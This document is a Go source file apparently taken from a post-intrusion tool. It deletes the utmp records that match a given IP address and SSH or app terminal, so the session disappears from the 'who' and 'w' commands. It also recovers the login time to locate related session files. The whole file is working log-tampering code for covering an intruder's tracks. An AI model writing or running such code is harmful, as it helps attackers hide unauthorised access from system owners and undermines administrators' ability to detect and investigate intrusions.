package utmp

// This shit Clears the "who" and the "w" command. Its supposed that works.
// God knows how.
import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	check "test/CHECK"
	vars "test/VARS"
	"time"
)

func ClearUTMP(x vars.ConnectedData) {

	CheckMe(x)
	StartToClearUTMP(x)

}

func CheckMe(x vars.ConnectedData) {
	for {
		res := CheckifLogout(x.SSHPTY)
		if !res {

			fmt.Println("I AM OUT")
			break
		} else {
			fmt.Println("i am logged in")
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func GetWho() []string {
	cmd := exec.Command("who")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error executing command:", err)
	}
	outSpit := strings.Split(out.String(), "\n")
	check.Check("Error on Compile PAtern UTMP", err)
	return outSpit
}

func CheckifLogout(sshPTY string) bool {
	// breakFor := false
	// for {
	whoData := GetWho()
	for _, j := range whoData {
		if strings.Contains(j, sshPTY) {
			return true
		}
	}
	return false
}

func StartToClearUTMP(x vars.ConnectedData) {

	file, err := os.Open(vars.UTMP_FILE)

	if err != nil {
		fmt.Println("Error opening utmp file:", err)
		return
	}
	defer file.Close()

	// Read and parse the utmp entries
	count := 0
	found := []int{}
	for {
		var entry vars.Utmp
		err = binary.Read(file, binary.LittleEndian, &entry)
		if err != nil {
			break
		}

		// Convert byte arrays to strings
		line := bytes.Trim(entry.Device[:], "\x00")
		// user := bytes.Trim(entry.User[:], "\x00")
		host := bytes.Trim(entry.Host[:], "\x00")
		count += 1
		if string(host) == x.IP && (string(line) == x.AppPTY || string(line) == x.SSHPTY) {
			found = append(found, count)
		}
	}

	sort.Slice(found, func(i, j int) bool {
		return found[i] > found[j]
	})

	for _, j := range found {
		startPosition := int64((j - 1) * vars.UTMP_SIZE)
		fileInfo, err := file.Stat()
		if err != nil {
			fmt.Println("Error getting file info:", err)
			return
		}
		originalSize := fileInfo.Size()
		endPosition := startPosition + int64(vars.UTMP_SIZE)
		if endPosition > originalSize {
			fmt.Println("End position exceeds file size. Cannot remove 384 bytes.")
			return
		}

		// Read the part before the start position
		before := make([]byte, startPosition)
		_, err = file.ReadAt(before, 0)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		// Read the part after the 50 bytes to be removed
		after := make([]byte, originalSize-endPosition)
		_, err = file.ReadAt(after, endPosition)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		// Combine the parts before and after the 50 bytes to be removed
		newContent := append(before, after...)

		// Write the new content back to the file
		err = os.WriteFile(vars.UTMP_FILE, newContent, 0644)
		if err != nil {
			fmt.Println("Error writing file:", err)
			return
		}
	}
}

func ParceUtmpFileToGetEpoch(x vars.ConnectedData) (int32, error) {

	file, err := os.Open(vars.UTMP_FILE)
	if err != nil {
		fmt.Println("Error opening utmp file:", err)
		return 0, err
	}
	defer file.Close()

	utmpRecordSize := binary.Size(vars.Utmp{})
	buf := make([]byte, utmpRecordSize)
	var timeEpochSSH int32
	for {
		_, err := file.Read(buf)
		if err != nil {
			break
		}

		var utmpRecord vars.Utmp
		err = binary.Read(bytes.NewReader(buf), binary.LittleEndian, &utmpRecord)
		if err != nil {
			fmt.Println("Error reading utmp record:", err)
			continue
		}

		// Convert byte arrays to strings and print
		// user := string(bytes.Trim(utmpRecord.User[:], "\x00"))
		device := string(bytes.Trim(utmpRecord.Device[:], "\x00"))
		host := string(bytes.Trim(utmpRecord.Host[:], "\x00"))
		// loginTime := time.Unix(int64(), int64(utmpRecord.Time.Usec))
		if x.IP == host && x.SSHPTY == device && int32(x.FirstSpownID) == utmpRecord.Pid {
			timeEpochSSH = utmpRecord.Time.Sec
		}

		// fmt.Printf("User: %s, Device: %s, Host: %s, Login Time: %s\n", user, device, host, loginTime)
	}
	return timeEpochSSH, nil
}

func GetSessionId(epoch int32) (string, error) {
	// dir, err := os.Open(vars.Sessions)
	// check.Check("Error on Opening Folder Session", err)
	// defer dir.Close()
	files, err := os.ReadDir(vars.Sessions)
	check.Check("Error on Opening Folder Session", err)
	intNum := int(epoch)
	strNum := strconv.Itoa(intNum)
	for _, f := range files {
		if f.Type().IsRegular() {
			fp := filepath.Join(vars.Sessions, f.Name())
			c, err := os.ReadFile(fp)
			check.Check("Error on Reading File :", err)
			fileContent := strings.Split(string(c), "\n")
			for _, j := range fileContent {
				if strings.Contains(j, strNum) {
					return f.Name(), nil
				}
			}
		}
	}
	return "", errors.New("NoFileFound")
}

func Pouse() {
	fmt.Println("Press any key to continue...")

	// Create a new reader
	reader := bufio.NewReader(os.Stdin)

	// Read a single character from the input
	_, _, err := reader.ReadRune()
	if err != nil {
		fmt.Println("Error reading input:", err)
		return
	}

	fmt.Println("Continuing...")
}
